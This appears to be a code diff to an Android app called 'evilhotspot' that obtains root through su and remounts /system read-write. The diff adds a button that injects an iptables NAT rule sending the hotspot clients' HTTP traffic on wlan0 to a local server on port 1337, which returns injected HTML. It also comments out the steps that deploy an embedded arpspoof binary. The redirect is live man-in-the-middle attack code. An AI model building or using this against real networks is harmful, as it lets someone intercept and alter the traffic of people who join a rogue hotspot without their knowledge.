@@ -69,6 +69,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         rtButton.setOnClickListener(this);
         Button htmlButton = (Button) findViewById(R.id.htmlbutton);
         htmlButton.setOnClickListener(this);
+        Button ruleButton = (Button) findViewById(R.id.iptablesButton);
+        ruleButton.setOnClickListener(this);
 
         //Log.e("MyTemp", netInterface.getDisplayName());
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
@@ -129,8 +131,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                                     //requestTask rt = new requestTask();
                                     //Document response = rt.doInBackground("http://bash.org.pl/");
                                     //JUST SEND SOMETHING !
-                                    out.write("SOMETHING!");
-                                    out.flush();
+                                    out.write("<h1>SOMETHING!</h1>");
+                                    //out.flush();
                                     out.close();
                                     handler.post(new Runnable() {
                                         @Override
@@ -192,6 +194,11 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 Log.d("BUTTONS", "root test button pressed");
                 rtPressed();
                 break;
+
+            case R.id.iptablesButton:
+                Log.d("BUTTONS", "inject rule button pressed");
+                iptablesRulePressed((Button)findViewById(R.id.iptablesButton));
+                break;
         }
     }
 
@@ -216,20 +223,18 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         try {
             //Preform su to get root privileges
             p = Runtime.getRuntime().exec("su");
-            // Attempt to write a file to a root-only directory
             DataOutputStream os = new DataOutputStream(p.getOutputStream());
             //remount the filesystem as read and write, had some problems with road-only fs
             os.writeBytes("mount -o rw,remount /system\n");
+            // Attempt to write a file to a root-only directory
             os.writeBytes("echo \"Do I have root?\" > /system/temporary.txt\n");
 
             //arpspoof (attempting to run a C program, build with NDK)
             //get resource handle
-            InputStream raw = getResources().openRawResource(R.raw.arpspoof);
-            saveFile("arpspoof", raw);
+            //InputStream raw = getResources().openRawResource(R.raw.arpspoof);
+            //saveFile("arpspoof", raw);
             //os.writeBytes("chmod 700 /data/data/android.evilhotspot/files/arpspoof\n");
-            //os.writeBytes("/data/data/android.evilhotspot/files/arpspoof -i wlan0 -t 192.168.43.1 192.168.43.229 \n");
             // Close the terminal
-            //os.writeBytes("mount -o ro,remount /system");
             os.writeBytes("exit\n");
             os.flush();
             try {
@@ -258,6 +263,45 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             return 3;
         }
     }
+
+    //inject/remove iptables rule that will route http traffic to our app
+    private int iptablesRulePressed(Button ruleButton){
+        Process p;
+        try {
+            //Preform su to get root privileges
+            p = Runtime.getRuntime().exec("su");
+            DataOutputStream os = new DataOutputStream(p.getOutputStream());
+
+            if (ruleButton.getText().toString().equals("Inject rule"))
+                os.writeBytes("iptables -t nat -I PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337\n");
+            else
+                os.writeBytes("iptables -t nat -D PREROUTING 1\n");
+
+            os.writeBytes("exit\n");
+            os.flush();
+            try {
+                p.waitFor();
+                if(p.exitValue() == 0){
+                    toastMessage("success");
+                    if (ruleButton.getText().toString().equals("Inject rule"))
+                        ruleButton.setText("Remove rule");
+                    else
+                        ruleButton.setText("Inject rule");
+                    return 0;
+                }
+            } catch (InterruptedException e){
+                //Exit with 2 if we were rudely interrupted !
+                toastMessage("failure, intrp. exeption");
+                return 2;
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+            toastMessage("not root, I/O exeption");
+            return 3;
+        }
+        return 0;
+    }
+
 
     //for saving embedded raw binary blob as file that can be run on filesystem
     public int saveFile(String filename, InputStream raw ){
